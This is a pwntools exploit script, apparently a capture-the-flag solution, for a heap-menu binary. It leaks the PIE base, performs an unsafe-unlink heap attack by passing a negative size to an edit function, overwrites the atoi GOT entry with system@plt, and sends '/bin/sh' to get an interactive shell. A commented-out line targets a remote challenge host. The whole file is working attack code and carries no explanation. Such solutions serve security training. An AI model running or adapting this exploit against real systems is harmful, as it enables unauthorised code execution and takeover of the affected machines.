#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import*

context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'new-window'])
def debug(cmd=''):
	cmd += "b main\n"
	gdb.attach(p, cmd)
	pause()

host = "43.156.14.141"
port = 1150
p = process("./pwn.patch")
#p = remote(host, port)

def add(idx, size, content):
	p.sendlineafter("choice: ", "1")
	p.sendlineafter("index:\n", str(idx).encode())
	p.sendlineafter("size:\n", str(size).encode())
	p.sendafter("content:\n", content)
def view(idx):
	p.sendlineafter("choice: ", "2")
	p.sendlineafter("index:\n", str(idx).encode())	
def edit(idx, size, content):
	p.sendlineafter("choice: ", "3")
	p.sendlineafter("index:\n", str(idx).encode())
	p.sendlineafter("size:\n", str(size).encode())
	p.sendafter("content:\n", content)	
def delet(idx):
	p.sendlineafter("choice: ", "4")
	p.sendlineafter("index:\n", str(idx).encode())

for i in range(12):
	add(i+1, 0x90, "deadbeef")
for i in range(7):
	delet(i+1)

view(0)
p.recvuntil("content is:\n")
pie_base = u64(p.recvn(8))-0x13ff
log.success("pie_base:{}".format(hex(pie_base)))
heaplist =pie_base+0x40e0 + 10*0x8
log.success("heaplist:{}".format(hex(heaplist)))
aoti_got = pie_base + 0x000000000004068
sys_plt = pie_base + 0x000000000001144

payload = p64(0xc0) + p64(0x91)
payload += p64(heaplist-0x18)+p64(heaplist-0x10)
payload = payload.ljust(0x90, "\x00")
payload += p64(0x90) + p64(0xa0)
edit(10, -1, payload)

#debug()

delet(11)

payload = p64(0)*3+p64(aoti_got)
edit(10, -1, payload)
edit(10, -1, p64(sys_plt))
p.sendline("/bin/sh")
p.interactive()
